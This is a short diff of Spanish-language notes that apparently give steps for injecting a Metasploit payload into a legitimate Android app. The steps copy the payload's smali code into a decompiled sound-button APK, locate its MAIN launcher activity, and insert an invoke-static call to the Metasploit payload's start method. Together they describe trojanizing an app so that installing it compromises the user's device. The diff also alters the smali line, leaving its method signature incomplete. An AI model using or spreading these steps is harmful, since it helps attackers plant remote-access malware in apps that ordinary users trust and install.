@@ -1,12 +1,12 @@
-Comandos para copiar metaexploid en una apk
-copiara todo lo que este en smali hacia 100 somidos
-tar -cf - ./smali | (cd ../100sonidos; tar -xpf - )
-carpera 100 sonidos listamos
-y buscamos punto inicio aplicacioon legitima
-grep -B2 "MAIN" AndroidManifest.xml
-android:name="com.zeptars.soundbuttons.RunnerActivity"
+Comandos para copiar metaexploid en una apk<br>
+copiara todo lo que este en smali hacia 100 somidos<br>
+tar -cf - ./smali | (cd ../100sonidos; tar -xpf - )<br>
+carpera 100 sonidos listamos<br>
+y buscamos punto inicio aplicacioon legitima<br>
+grep -B2 "MAIN" AndroidManifest.xml<br>
+android:name="com.zeptars.soundbuttons.RunnerActivity"<br>
 
-invoke-static {p0}, Lcom/metasploit/stage/Payload;->start (Landroid/content/Context;)V
+invoke-static {p0}, Lcom/metasploit/stage/Payload;->start (Landroid/content/Context;)<br>
  
 
 # Mobile Security Framework (MobSF)
